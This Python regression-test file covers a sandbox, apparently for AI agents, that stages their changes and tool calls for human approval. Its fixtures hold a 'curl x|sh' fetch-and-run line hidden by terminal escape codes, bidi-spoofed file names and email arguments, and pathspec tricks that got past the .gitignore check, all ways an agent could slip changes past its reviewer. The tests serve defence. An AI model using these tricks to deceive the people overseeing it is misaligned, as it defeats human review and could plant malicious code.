"""Regression tests for bugs found in the review of sync, export, the held-call path and `forge up` (after C1-C4, S1-S5).

  V1  The sync-back review printed agent-controlled file names and file content RAW to the terminal. An escape
      sequence (ESC [2K, ESC [1A ...) or a bidi override in a diff line or a name can hide or reorder what the
      person reads before typing y.
  V2  `forge_sign.py call` showed the held call's arguments with ensure_ascii=False: DEL, C1 controls (U+009B is
      CSI) and bidi / zero-width characters reached the terminal raw, so the arguments the person approves can
      look different from the arguments that are signed.
  V3  The .gitignore check (git check-ignore) treated a git error as "not ignored" (fail open). A name that
      starts with ':' is read as pathspec magic; git exits 128, so an ignored path like ':!x.env' was applied.
  V4  The conflict check read an unreadable real file, or a directory, as "absent". A new file of the box then
      replaced your unreadable file without the conflict check, and a directory made apply_changes crash
      half-way with a temp file left in your repository.
  V5  export_changes opened every non-directory: a FIFO in the workspace hung the export forever, and a Unix
      socket crashed it, so the whole session's changes were lost.
  V7  The egress proxy dropped bytes that a client sent right after the CONNECT head in the same packet (an
      early TLS ClientHello): the tunnel then hung. Not a security bug (fails closed), a correctness bug.
  V6  `forge up` had no SIGTERM / SIGHUP handler: closing the terminal or a kill skipped the cleanup (the airlock
      container with the upstream credentials kept running; the run folder with the staged repository stayed).

Stdlib only, temp dirs, in-process (V6: a subprocess with fake docker calls). Run: python3 airlock/tests/rest_regress.py"""
import contextlib
import hashlib
import io
import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import unicodedata

HERE = os.path.dirname(os.path.abspath(__file__))
PKG = os.path.join(HERE, "..")
sys.path.insert(0, os.path.join(PKG, "engine"))
sys.path.insert(0, PKG)
sys.path.insert(0, os.path.join(PKG, "..", "cli"))
import sync  # noqa: E402
from policy import Policy  # noqa: E402

DOC = {"version": 1,
       "upstreams": [{"name": "fs", "transport": "stdio", "command": ["node", "x.js", "/ws"]}],
       "tools": {"allow": [{"tool": "read_file", "upstream": "fs", "path_args": {"path": "read"}}]},
       "paths": {"hidden_paths": ["secret/**"], "readonly_paths": ["tests/**"]}}
GENV = {"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "GIT_CONFIG_NOSYSTEM": "1", "HOME": "/nonexistent",
        "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}


def _git(*a, cwd=None):
    subprocess.run(["git"] + list(a), cwd=cwd, check=True, capture_output=True, env=GENV)


def _repo(d, files):
    os.makedirs(d)
    _git("init", "-q", "-b", "main", d)
    for rel, txt in files.items():
        os.makedirs(os.path.dirname(os.path.join(d, rel)) or d, exist_ok=True)
        with open(os.path.join(d, rel), "w") as f:
            f.write(txt)
    _git("add", "-A", cwd=d)
    _git("commit", "-q", "-m", "i", cwd=d)
    return d


def _bad_chars(text):
    """Characters that a terminal may act on or that change how a line reads (not newline)."""
    return sorted({c for c in text if c != "\n" and unicodedata.category(c) in ("Cc", "Cf", "Zl", "Zp", "Co", "Cs")})


class _Export:
    """An export folder plus change dicts as export_changes.py writes them."""

    def __init__(self, d):
        self.dir = d
        os.makedirs(os.path.join(d, "files"))
        self.n = 0

    def ch(self, rel, status, data=None):
        c = {"path": rel, "status": status, "symlink": False}
        if data is not None:
            self.n += 1
            with open(os.path.join(self.dir, "files", str(self.n)), "wb") as f:
                f.write(data)
            c.update(file=f"files/{self.n}", sha256=hashlib.sha256(data).hexdigest(), mode="100644")
        return c


# ---------------------------------------------------------------- V1
def v1_review_escapes():
    import forge_airlock as FA
    tmp = tempfile.mkdtemp()
    out = []
    try:
        real = _repo(os.path.join(tmp, "real"), {"src/app.py": "print('hi')\n", ".gitignore": "build/\n"})
        stage = os.path.join(tmp, "stage")
        shutil.copytree(real, stage)
        run_dir = os.path.join(tmp, "run")
        ex = _Export(os.path.join(run_dir, "export"))
        evil = ("print('hi')\nimport os; os.system('curl x|sh')\x1b[1A\x1b[2K\n"
                "# ‮harmless‬ comment\x9b2K\n").encode()
        changes = [ex.ch("src/app.py", "modified", evil),
                   ex.ch("src/n\x1b[2Kew‮.py", "added", b"x = 1\n"),
                   ex.ch("secret/\x1b]0;title\x07k", "added", b"k\n")]
        with open(os.path.join(run_dir, "export", "changes.json"), "w") as f:
            json.dump({"changes": changes}, f)
        pol = Policy(DOC, resolve=False)
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(io.StringIO()):
            FA.sync_back(pol, run_dir, stage, real)  # stdin is not a terminal here: nothing is applied
        text = buf.getvalue()
        bad = _bad_chars(text)
        out.append(("V1 sync review: no terminal control or bidi character from the box reaches the terminal",
                    not bad, f"raw characters in the review: {[hex(ord(c)) for c in bad]}"))
        out.append(("V1 sync review: the hidden change is still visible (escaped, not dropped)",
                    "curl x|sh')\\x1b[1A\\x1b[2K" in text and "\\u202e" in text, text[-400:]))
        with open(os.path.join(real, "src/app.py")) as f:
            out.append(("V1 sync review: control: nothing was applied without a y", f.read() == "print('hi')\n"))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return out


# ---------------------------------------------------------------- V2
def v2_held_call_display():
    import forge_sign
    args = {"to": "alice@example.com‮⁦moc.live⁩", "memo": "ok\x7f\x9b2K​", "n": 1}
    sha = hashlib.sha256(json.dumps(args, sort_keys=True, separators=(",", ":"), ensure_ascii=True,
                                    allow_nan=False).encode()).hexdigest()
    req = {"v": 1, "run": "r" * 16, "call": "c" * 32, "step": "s" * 32, "tool": "send", "args_sha256": sha,
           "arguments": args}
    text, ok = forge_sign.show_call(req)
    bad = _bad_chars(text)
    return [("V2 held call: the arguments a person approves show no raw control, bidi or zero-width character",
             not bad, f"raw characters: {[hex(ord(c)) for c in bad]}"),
            ("V2 held call: control: the hash still matches the arguments (display only)", ok),
            ("V2 held call: the escaped characters are named in the display", "\\u202e" in text and "\\u009b" in text,
             text)]


# ---------------------------------------------------------------- V3
def v3_ignored_fail_open():
    import forge_airlock as FA
    tmp = tempfile.mkdtemp()
    try:
        real = _repo(os.path.join(tmp, "real"), {".gitignore": "*.env\nnode_modules/\n", "a.txt": "a\n"})
        ign = FA.ignored_fn(real)
        return [("V3 .gitignore check: a name that git reads as pathspec magic (':!x.env', ignored by *.env) is "
                 "ignored (refused), not applied", ign(":!x.env") is True, ign(":!x.env")),
                ("V3 .gitignore check: ':(literal)a.env' is ignored too", ign(":(literal)a.env") is True),
                ("V3 .gitignore check: control: node_modules/x is ignored, a.txt is not",
                 ign("node_modules/x") is True and ign("a.txt") is False)]
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# ---------------------------------------------------------------- V4
def v4_conflict_unreadable_or_dir():
    out = []
    tmp = tempfile.mkdtemp()
    try:
        real, stage = os.path.join(tmp, "real"), os.path.join(tmp, "stage")
        os.makedirs(os.path.join(real, "src"))
        os.makedirs(os.path.join(stage, "src"))
        ex = _Export(os.path.join(tmp, "export"))
        # your own file, made after the box started, that you cannot read (e.g. root-owned 0600 from sudo)
        mine = os.path.join(real, "src", "notes.txt")
        with open(mine, "w") as f:
            f.write("my notes\n")
        os.chmod(mine, 0)
        os.makedirs(os.path.join(real, "src", "gen"))  # a directory you made after the box started
        with open(os.path.join(real, "src", "gen", "keep.txt"), "w") as f:
            f.write("keep\n")
        pol = Policy(DOC, resolve=False)
        changes = [ex.ch("src/notes.txt", "added", b"box wins\n"), ex.ch("src/ok.txt", "added", b"fine\n"),
                   ex.ch("src/gen", "added", b"box file\n")]  # order: the overwrite happens before the crash
        apply, rejected = sync.plan(pol, changes, ex.dir, stage, real)
        rej = dict(rejected)
        out.append(("V4 sync: a real file you cannot read is a conflict (not overwritten)",
                    "src/notes.txt" in rej, sorted(c["path"] for c in apply)))
        out.append(("V4 sync: a real directory where the box adds a file is refused at plan time",
                    "src/gen" in rej, sorted(c["path"] for c in apply)))
        crash = None
        try:
            done = sync.apply_changes(apply, real)
        except OSError as e:
            crash, done = f"{type(e).__name__}: {e}", []
        left = [n for n in os.listdir(os.path.join(real, "src")) if n.startswith(".forge-airlock.")]
        out.append(("V4 sync: apply does not crash and leaves no temp file in your repository",
                    crash is None and not left, (crash, left)))
        os.chmod(mine, 0o600)
        with open(mine) as f:
            out.append(("V4 sync: your unreadable file keeps its content", f.read() == "my notes\n"))
        out.append(("V4 sync: control: the other new file is applied", "src/ok.txt" in done))
        # apply_changes alone (a target that turned into a directory after the plan): no crash, no temp file
        os.makedirs(os.path.join(real, "src", "late"))
        c = dict(ex.ch("src/late", "added", b"x\n"), new=b"x\n", base=os.path.join(stage, "src", "late"))
        try:
            d2 = sync.apply_changes([c], real)
            crash2 = None
        except OSError as e:
            crash2, d2 = f"{type(e).__name__}: {e}", []
        left = [n for n in os.listdir(os.path.join(real, "src")) if n.startswith(".forge-airlock.")]
        out.append(("V4 sync: a write that fails at the last step is skipped and its temp file removed",
                    crash2 is None and not left and d2 == [], (crash2, left)))
    finally:
        for d, _, fs in os.walk(tmp):
            for x in fs:
                try:
                    os.chmod(os.path.join(d, x), 0o600)
                except OSError:
                    pass
        shutil.rmtree(tmp, ignore_errors=True)
    return out


# ---------------------------------------------------------------- V5
def v5_export_special_files():
    import export_changes as E
    out = []
    tmp = tempfile.mkdtemp(prefix="fx")  # short path: a Unix socket path has a length limit
    srv = None
    try:
        ws = _repo(os.path.join(tmp, "ws"), {"a.txt": "a\n"})
        gd = os.path.join(ws, ".git")
        with open(os.path.join(ws, "a.txt"), "w") as f:
            f.write("changed\n")
        os.mkfifo(os.path.join(ws, "pipe"))
        srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv.bind(os.path.join(ws, "s.sock"))
        pol_file = os.path.join(tmp, "forge.yaml")
        with open(pol_file, "w") as f:
            json.dump(DOC, f)
        res = {}

        def go():
            argv = sys.argv
            sys.argv = ["export_changes.py", pol_file, ws, gd, os.path.join(tmp, "out")]
            try:
                with contextlib.redirect_stdout(io.StringIO()):
                    E.main()
                res["ok"] = True
            except Exception as e:  # noqa: BLE001
                res["err"] = f"{type(e).__name__}: {e}"
            finally:
                sys.argv = argv
        t = threading.Thread(target=go, daemon=True)
        t.start()
        t.join(10)
        hung = t.is_alive()
        if hung:  # unblock the reader of the FIFO so the thread ends
            fd = os.open(os.path.join(ws, "pipe"), os.O_WRONLY | os.O_NONBLOCK)
            os.close(fd)
            t.join(10)
        out.append(("V5 export: a FIFO in the workspace does not hang the export", not hung))
        out.append(("V5 export: a FIFO or a socket does not crash the export", res.get("ok") is True,
                    res.get("err")))
        got = {}
        try:
            with open(os.path.join(tmp, "out", "changes.json")) as f:
                got = {c["path"]: c for c in json.load(f)["changes"]}
        except (OSError, ValueError):
            pass
        out.append(("V5 export: special files are listed as refused, never exported",
                    "refused" in got.get("pipe", {}) and "refused" in got.get("s.sock", {}), sorted(got)))
        out.append(("V5 export: control: the real change is still exported",
                    "a.txt" in got and "refused" not in got["a.txt"] and "file" in got["a.txt"], sorted(got)))
    finally:
        if srv is not None:
            srv.close()
        shutil.rmtree(tmp, ignore_errors=True)
    return out


# ---------------------------------------------------------------- V6
DRIVER = r'''
import os, signal, sys, json, time, tempfile
sys.path.insert(0, sys.argv[1]); sys.path.insert(0, os.path.join(sys.argv[1], "engine"))
import forge_airlock as FA
from policy import Policy
log, repo, sig = sys.argv[2], sys.argv[3], int(sys.argv[4])
def rec(x):
    with open(log, "a") as f: f.write(json.dumps(x) + "\n")
pol = Policy(json.load(open(os.path.join(repo, "forge.yaml"))), resolve=False)
FA.need_docker = lambda: None
FA.build_images = lambda claude: None
FA.load_policy = lambda p, r=None: (pol, {})
FA.B.docker_runtimes = lambda: {"runc"}
FA.stage_repo = lambda repo, dest: (os.makedirs(dest), dest)[1]
mk = tempfile.mkdtemp
def mkdtemp(**kw):
    d = mk(**kw); rec({"run_dir": d}); return d
FA.tempfile.mkdtemp = mkdtemp
class R:
    returncode, stdout = 0, "PASSED"
def run(cmd, **kw):
    rec({"cmd": cmd})
    if "agent" in cmd and "run" in cmd:
        os.kill(os.getpid(), sig)
        time.sleep(5)
    return R()
FA.run = run
real_out = FA.out
FA.out = lambda cmd, **kw: real_out(cmd, **kw) if cmd[0] == "git" else R()
sys.exit(FA.main(["up", "--repo", repo, "--", "sh"]))
'''


def v6_signal_cleanup():
    out = []
    tmp = tempfile.mkdtemp()
    try:
        repo = _repo(os.path.join(tmp, "repo"), {"forge.yaml": json.dumps(DOC)})
        drv = os.path.join(tmp, "driver.py")
        with open(drv, "w") as f:
            f.write(DRIVER)
        for sig in (signal.SIGTERM, signal.SIGHUP):
            log = os.path.join(tmp, f"log{int(sig)}")
            r = subprocess.run([sys.executable, drv, PKG, log, repo, str(int(sig))], capture_output=True,
                               text=True, timeout=60)
            recs = [json.loads(x) for x in open(log)] if os.path.exists(log) else []
            run_dirs = [x["run_dir"] for x in recs if "run_dir" in x]
            downs = [x for x in recs if "cmd" in x and "down" in x["cmd"]]
            left = [d for d in run_dirs if os.path.exists(d)]
            for d in left:
                shutil.rmtree(d, ignore_errors=True)
            out.append((f"V6 forge up: {signal.Signals(sig).name} during the box run still runs `compose down` "
                        "and removes the run folder", bool(downs) and not left and run_dirs,
                        (r.returncode, len(downs), left, r.stderr[-300:])))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return out


def v7_egress_early_bytes():
    import egress_proxy as E
    socks = []

    def listener(handler):
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        s.listen(8)
        socks.append(s)

        def loop():
            while True:
                try:
                    c, _ = s.accept()
                except OSError:
                    return
                threading.Thread(target=handler, args=(c,), daemon=True).start()
        threading.Thread(target=loop, daemon=True).start()
        return s.getsockname()[1]

    def echo(c):
        try:
            while True:
                d = c.recv(4096)
                if not d:
                    return
                c.sendall(d)
        except OSError:
            pass
    ep = listener(echo)
    E.ALLOW.add(f"localhost:{ep}")
    pp = listener(E.handle)
    out = []
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            s = socket.create_connection(("127.0.0.1", pp), timeout=3)
            s.sendall(f"CONNECT localhost:{ep} HTTP/1.1\r\nHost: x\r\n\r\n".encode() + b"HELLO")
            got = b""
            try:
                while b"HELLO" not in got:
                    d = s.recv(200)
                    if not d:
                        break
                    got += d
            except OSError:
                pass
            s.close()
            r = socket.create_connection(("127.0.0.1", pp), timeout=3)
            r.sendall(f"CONNECT 127.0.0.1:{ep} HTTP/1.1\r\n\r\nHELLO".encode())
            refused = r.recv(100)
            r.close()
        out.append(("V7 egress: bytes sent right after the CONNECT head reach the upstream (not dropped)",
                    b" 200 " in got and got.endswith(b"HELLO"), got[:80]))
        out.append(("V7 egress: control: a host not on the allowlist is still refused 403", b" 403 " in refused,
                    refused[:40]))
    finally:
        E.ALLOW.discard(f"localhost:{ep}")
        for s in socks:
            s.close()
    return out


def cases():
    out = []
    for fn in (v1_review_escapes, v2_held_call_display, v3_ignored_fail_open, v4_conflict_unreadable_or_dir,
               v5_export_special_files, v6_signal_cleanup, v7_egress_early_bytes):
        try:
            out.extend(fn())
        except Exception as e:  # noqa: BLE001
            out.append((f"{fn.__name__} crashed: {type(e).__name__}: {e}", False, ""))
    return out


if __name__ == "__main__":
    res = cases()
    for name, ok, *detail in res:
        print(("ok    " if ok else "FAIL  ") + name + ("" if ok or not detail else f"   {detail[0]}"), flush=True)
    failed = sum(1 for r in res if not r[1])
    print(f"{len(res)} cases, {failed} failed")
    sys.exit(1 if failed else 0)
